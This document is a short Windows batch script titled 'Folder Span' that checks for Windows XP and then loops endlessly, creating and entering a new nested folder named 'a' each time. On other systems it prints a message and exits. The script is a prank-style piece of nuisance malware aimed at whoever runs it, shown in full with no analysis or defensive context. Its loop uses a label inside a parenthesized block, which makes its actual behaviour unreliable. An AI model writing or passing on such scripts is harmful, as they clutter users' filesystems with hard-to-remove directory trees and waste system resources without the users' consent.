@echo off
title Folder Span

for /f "tokens=4-5 delims=. " %%i in ('ver') do set VERSION=%%i.%%j

if "%version%" == "5.1" (
    :loop
    mkdir a
    cd a
    goto loop
) else (
	echo.
    echo You not in Windows XP
    echo.
    pause
    exit
)
